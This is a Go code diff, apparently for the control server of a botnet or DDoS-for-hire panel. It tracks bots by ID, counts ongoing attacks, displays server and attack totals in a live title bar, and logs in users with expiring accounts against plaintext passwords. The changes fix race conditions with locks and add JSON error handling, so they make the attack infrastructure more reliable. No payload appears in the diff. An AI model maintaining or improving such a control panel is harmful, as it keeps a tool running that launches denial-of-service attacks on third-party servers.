@@ -52,7 +52,10 @@ func AuthUser(username string, password string) (bool, *User) {
 	if err != nil {
 		return false, nil
 	}
-	json.Unmarshal(usersFile, &users)
+	if err := json.Unmarshal(usersFile, &users); err != nil {
+		logMsg("[AUTH] Failed to parse users.json: %v", err)
+		return false, nil
+	}
 	for _, user := range users {
 		if user.Username == username && user.Password == password {
 			if user.Expire.After(time.Now()) {
@@ -257,13 +260,18 @@ func pingHandler(conn net.Conn, botID string, stop chan struct{}) {
 
 func updateTitle() {
 	for {
-		for _, cl := range clients {
+		clientsLock.RLock()
+		snapshot := make([]*client, len(clients))
+		copy(snapshot, clients)
+		clientsLock.RUnlock()
+
+		for _, cl := range snapshot {
 			go func(c *client) {
 				spinChars := []rune{'∴', '∵'} // Spinning animation characters
 				spinIndex := 0
 
 				for {
-					attackCount := len(ongoingAttacks)
+					attackCount := getActiveAttackCount()
 
 					// Format title with live stats
 					title := fmt.Sprintf("    [%c]  Servers: %d | Attacks: %d/%d | ℣ | User: %s [%s] [%c]",
@@ -400,6 +408,8 @@ func getArchMap() map[string]int {
 // Uses the ongoingAttacks map to track in-progress attacks
 // Thread-safe read access for UI display
 func getActiveAttackCount() int {
+	ongoingAttacksLock.RLock()
+	defer ongoingAttacksLock.RUnlock()
 	return len(ongoingAttacks)
 }
 
